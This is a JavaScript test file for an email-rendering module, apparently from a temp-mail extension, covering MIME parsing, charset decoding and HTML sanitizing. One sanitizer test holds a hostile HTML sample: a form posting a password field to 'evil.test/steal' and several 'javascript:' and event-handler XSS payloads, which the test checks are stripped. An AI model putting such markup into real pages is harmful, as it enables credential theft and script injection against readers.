const assert = require('node:assert/strict');
const { readFileSync } = require('node:fs');
const { join } = require('node:path');
const { test } = require('node:test');
const { runInNewContext } = require('node:vm');

const scope = { window: {}, TextDecoder, TextEncoder, atob, console };
runInNewContext(readFileSync(join(__dirname, '../popup-modules/mail-render.js'), 'utf8'), scope);
const renderer = scope.window.PopupMailRenderer.createMailRenderer({});

test('quoted-printable preserves HTML percentage widths and adjacent syntax', () => {
  const encoded = '<table width=3D"100%" style=3D"width:100%; max-width:100%"><td>100%</td></table>';
  const expected = '<table width="100%" style="width:100%; max-width:100%"><td>100%</td></table>';
  assert.equal(renderer.decodeQuotedPrintable(encoded), expected);
});

test('quoted-printable leaves URL percent escapes and encoded percent signs intact', () => {
  const encoded = '<a href=3D"https://example.test/a%20b?next=3D%2Fhome&literal=3D=2520">50%</a>';
  const expected = '<a href="https://example.test/a%20b?next=%2Fhome&literal=%20">50%</a>';
  assert.equal(renderer.decodeQuotedPrintable(encoded), expected);
  assert.equal(renderer.decodeQuotedPrintable('percent %41 %E4%BD%A0 %zz %'), 'percent %41 %E4%BD%A0 %zz %');
});

test('quoted-printable decodes UTF-8 and keeps CRLF or LF hard line breaks', () => {
  assert.equal(renderer.decodeQuotedPrintable('=E4=BD=A0=E5=A5=BD =C2=A9 =F0=9F=98=80'), '\u4f60\u597d \u00a9 \ud83d\ude00');
  assert.equal(renderer.decodeQuotedPrintable('caf=c3=a9\r\nnext\nline'), 'caf\u00e9\r\nnext\nline');
  assert.equal(renderer.decodeQuotedPrintable('literal \u4f60\u597d 100%'), 'literal \u4f60\u597d 100%');
});

test('quoted-printable joins transport soft breaks without eating literal characters', () => {
  assert.equal(renderer.decodeQuotedPrintable('width=3D"100%=\r\n";=\n next=3Dyes'), 'width="100%"; next=yes');
  assert.equal(renderer.decodeQuotedPrintable('=3D41 =0G =Z1 =A = %'), '=41 =0G =Z1 =A = %');
  assert.equal(renderer.decodeQuotedPrintable(''), '');
});

test('Temp Mail multipart parsing preserves layout from the raw MIME source', () => {
  const encodedHtml = '<html><head><style>table { width:100%; } .cell { padding:5%; }</style></head>'
    + '<body><table width=3D"100%"><tr><td class=3D"cell">'
    + '<table width=3D"100%"><tr><td>Verify your email</td></tr></table>'
    + '</td></tr></table></body></html>';
  const raw = [
    'MIME-Version: 1.0',
    'Content-Type: multipart/alternative; boundary="layout-test"',
    '',
    '--layout-test',
    'Content-Type: text/plain; charset=utf-8',
    '',
    'Verify your email',
    '--layout-test',
    'Content-Type: text/html; charset=utf-8',
    'Content-Transfer-Encoding: quoted-printable',
    '',
    encodedHtml,
    '--layout-test--'
  ].join('\r\n');
  assert.equal(renderer.parseEmailBody(raw).html, encodedHtml.replace(/=3D/g, '='));
});

test('single-part quoted-printable text and base64 HTML still decode', () => {
  const textRaw = 'Content-Type: text/plain\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n100% =3D done';
  assert.equal(renderer.parseEmailBody(textRaw).text, '100% = done');
  const html = '<table width="100%"><tr><td>\u4f60\u597d</td></tr></table>';
  const base64Raw = 'Content-Type: text/html\nContent-Transfer-Encoding: base64\n\n' + Buffer.from(html).toString('base64');
  assert.equal(renderer.parseEmailBody(base64Raw).html, html);
});

// ---------------- MIME 解析健壮性（H1 / M5 / M6 / M7 / L13 / L14） ----------------

const crlf = (lines) => lines.join('\r\n');

test('multipart with preamble and epilogue parses without infinite recursion', () => {
  const raw = crlf([
    'MIME-Version: 1.0',
    'Content-Type: multipart/alternative; boundary="b1"',
    '',
    'This is a multi-part message in MIME format.',
    '--b1',
    'Content-Type: text/plain; charset=utf-8',
    '',
    'plain body',
    '--b1',
    'Content-Type: text/html; charset=utf-8',
    '',
    '<p>html body</p>',
    '--b1--',
    'epilogue junk'
  ]);
  assert.deepEqual({ ...renderer.parseEmailBody(raw) }, { html: '<p>html body</p>' });
  assert.deepEqual({ ...renderer.parseEmailBody(raw, { includeText: true }) }, { html: '<p>html body</p>', text: 'plain body' });
  assert.deepEqual({ ...renderer.parseEmailParts(raw) }, { html: '<p>html body</p>', text: 'plain body' });
});

test('nested multipart with preambles at each level', () => {
  const raw = crlf([
    'Content-Type: multipart/mixed; boundary="outer"',
    '',
    'outer preamble',
    '--outer',
    'Content-Type: multipart/alternative;',
    '\tboundary="inner"',
    '',
    'inner preamble',
    '--inner',
    'Content-Type: text/plain',
    '',
    'nested text',
    '--inner',
    'Content-Type: text/html',
    'Content-Transfer-Encoding: quoted-printable',
    '',
    '<div class=3D"x">nested html</div>',
    '--inner--',
    '',
    '--outer',
    'Content-Type: application/pdf; name="a.pdf"',
    'Content-Disposition: attachment; filename="a.pdf"',
    'Content-Transfer-Encoding: base64',
    '',
    'JVBERi0xLjQK',
    '--outer--'
  ]);
  assert.deepEqual({ ...renderer.parseEmailParts(raw) }, { html: '<div class="x">nested html</div>', text: 'nested text' });
});

test('malformed self-similar multipart stays bounded and never throws', () => {
  // 每层都声明同一个 boundary 且缺结束符，旧实现会无限递归
  const raw = crlf([
    'Content-Type: multipart/mixed; boundary="z"',
    '',
    'preamble',
    '--z',
    'Content-Type: multipart/mixed; boundary="z"',
    '',
    '--z',
    'Content-Type: text/plain',
    '',
    'deep'
  ]);
  const parsed = renderer.parseEmailBody(raw);
  assert.equal(typeof parsed.text === 'string' || typeof parsed.html === 'string', true);
});

test('single-part body with a dashed separator line is not treated as multipart', () => {
  const raw = 'Line 1\r\n--------------------\r\nYour code is 123456';
  assert.equal(renderer.parseEmailBody(raw).text, raw);
  const withHeaders = 'Content-Type: text/plain\r\n\r\nHello\r\n--------\r\nCode: 654321\r\n--------';
  assert.equal(renderer.parseEmailBody(withHeaders).text, 'Hello\r\n--------\r\nCode: 654321\r\n--------');
});

test('headerless body is split only when both --X and --X-- lines exist', () => {
  const raw = crlf(['--abc123', 'Content-Type: text/plain', '', 'guessed part', '--abc123--']);
  assert.equal(renderer.parseEmailBody(raw).text, 'guessed part');
  const noClose = crlf(['intro', '--abc123', 'still plain text']);
  assert.equal(renderer.parseEmailBody(noClose).text, noClose);
});

test('attachments never override the message body (first body part wins)', () => {
  const raw = crlf([
    'Content-Type: multipart/mixed; boundary="m"',
    '',
    '--m',
    'Content-Type: text/plain; charset=utf-8',
    '',
    'real body',
    '--m',
    'Content-Type: text/plain; name="a.txt"',
    'Content-Disposition: attachment; filename="a.txt"',
    '',
    'attachment content',
    '--m',
    'Content-Type: text/html; name="b.html"',
    '',
    '<p>html attachment</p>',
    '--m',
    'Content-Type: text/plain',
    '',
    'second body',
    '--m--'
  ]);
  assert.deepEqual({ ...renderer.parseEmailParts(raw) }, { html: '', text: 'real body' });
});

test('GBK base64 part decodes with its declared charset', () => {
  // "你好验证码 123456" 的 GBK 字节
  const gbk = Buffer.from([0xC4, 0xE3, 0xBA, 0xC3, 0xD1, 0xE9, 0xD6, 0xA4, 0xC2, 0xEB, 0x20, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36]);
  const raw = crlf([
    'Content-Type: multipart/alternative; boundary="g"',
    '',
    '--g',
    'Content-Type: text/plain; charset="GBK"',
    'Content-Transfer-Encoding: base64',
    '',
    gbk.toString('base64'),
    '--g--'
  ]);
  assert.equal(renderer.parseEmailBody(raw).text, '你好验证码 123456');
  assert.equal(renderer.decodeBase64UTF8(gbk.toString('base64'), 'gb2312'), '你好验证码 123456');
});

test('ISO-8859-1 quoted-printable decodes with its declared charset', () => {
  const raw = 'Content-Type: text/plain; charset=ISO-8859-1\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\ncaf=E9 na=EFve';
  assert.equal(renderer.parseEmailBody(raw).text, 'café naïve');
  // 非 UTF-8 charset 下字面 Unicode 字符原样保留
  assert.equal(renderer.decodeQuotedPrintable('你 caf=E9', 'iso-8859-1'), '你 café');
});

test('unknown charset falls back to UTF-8 and old single-argument calls still work', () => {
  assert.equal(renderer.decodeQuotedPrintable('caf=C3=A9', 'x-no-such-charset'), 'café');
  assert.equal(renderer.decodeBase64UTF8(Buffer.from('你好').toString('base64')), '你好');
  assert.equal(renderer.decodeQuotedPrintable('emoji 😀 ok'), 'emoji 😀 ok');
});

test('7bit / 8bit bodies are kept as-is', () => {
  const raw = 'Content-Type: text/plain; charset=gbk\r\nContent-Transfer-Encoding: 8bit\r\n\r\n=3D stays 你好';
  assert.equal(renderer.parseEmailBody(raw).text, '=3D stays 你好');
});

test('headers without a space after the colon are recognized', () => {
  const raw = 'content-type:text/html;charset=utf-8\r\ncontent-transfer-encoding:base64\r\n\r\n' + Buffer.from('<b>hi</b>').toString('base64');
  assert.equal(renderer.parseEmailBody(raw).html, '<b>hi</b>');
});

test('folded headers are unfolded before matching', () => {
  const raw = crlf([
    'Content-Type:',
    ' multipart/alternative;',
    '\tboundary="fold"',
    '',
    '--fold',
    'Content-Type:',
    '  text/html;',
    '  charset=iso-8859-1',
    'Content-Transfer-Encoding:',
    '  quoted-printable',
    '',
    '<p>caf=E9</p>',
    '--fold--'
  ]);
  assert.equal(renderer.parseEmailBody(raw).html, '<p>café</p>');
});

// ---------------- 依赖 DOM 的部分：有 jsdom 时才跑 ----------------

let JSDOM = null;
try {
  ({ JSDOM } = require('jsdom'));
} catch (error) {
  JSDOM = null;
}

function createDomRenderer() {
  const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
  const domScope = {
    window: {},
    TextDecoder,
    TextEncoder,
    atob,
    console,
    DOMParser: dom.window.DOMParser,
    document: dom.window.document
  };
  runInNewContext(readFileSync(join(__dirname, '../popup-modules/mail-render.js'), 'utf8'), domScope);
  return domScope.window.PopupMailRenderer.createMailRenderer({});
}

test('htmlToText turns block elements into line breaks and drops style/script', { skip: !JSDOM && 'jsdom 不可用' }, () => {
  const domRenderer = createDomRenderer();
  const html = '<html><head><title>T</title><style>.a{color:red}</style></head><body>'
    + '<style>p{margin:0}</style><script>var x = 1;</script>'
    + '<h1>Hello</h1><p>Your code\n   is <b>123456</b></p><div>Line A<br>Line B</div>'
    + '<table><tr><td>Name</td><td>Value</td></tr><tr><td>k</td><td>v</td></tr></table>'
    + '<ul><li>one</li><li>two</li></ul><p></p><p></p><p>End&nbsp;here</p></body></html>';
  assert.equal(
    domRenderer.htmlToText(html),
    'Hello\n\nYour code is 123456\n\nLine A\nLine B\n\nName Value\n\nk v\n\none\n\ntwo\n\nEnd here'
  );
});

test('sanitizer unwraps form/button but keeps their content and strips dangerous parts', { skip: !JSDOM && 'jsdom 不可用' }, () => {
  const domRenderer = createDomRenderer();
  const html = '<form action="https://evil.test/steal" method="post"><p>Welcome body</p>'
    + '<input name="pw"><button type="submit" formaction="javascript:alert(1)" onclick="alert(1)"><span>Click</span></button>'
    + '<script>alert(1)</script><img src="x" onerror="alert(1)"><a href="javascript:alert(1)">bad</a></form>';
  const { html: out } = domRenderer.sanitizeEmailHtml(html);
  assert.match(out, /<p>Welcome body<\/p>/);
  assert.match(out, /<span>Click<\/span>/);
  assert.doesNotMatch(out, /<form|<button|<input|<script|onerror|onclick|javascript:/i);
  assert.doesNotMatch(out, /evil\.test|method=/i);
});

test('inline body part carrying a name parameter is still used as the body', () => {
  const inlineNamed = 'Content-Type: multipart/mixed; boundary="M"\r\n\r\n--M\r\nContent-Type: text/html; name="body.html"\r\nContent-Disposition: inline\r\n\r\n<p>hi</p>\r\n--M--';
  assert.equal(renderer.parseEmailParts(inlineNamed).html, '<p>hi</p>');
  const onlyNamed = 'Content-Type: multipart/mixed; boundary="M"\r\n\r\n--M\r\nContent-Type: text/html; name="body.html"\r\n\r\n<p>only</p>\r\n--M--';
  assert.equal(renderer.parseEmailParts(onlyNamed).html, '<p>only</p>');
  const bodyThenNamed = 'Content-Type: multipart/mixed; boundary="M"\r\n\r\n--M\r\nContent-Type: text/plain\r\n\r\nBODY\r\n--M\r\nContent-Type: text/plain; name="a.txt"\r\n\r\nATTACH\r\n--M--';
  assert.equal(renderer.parseEmailParts(bodyThenNamed).text, 'BODY');
});
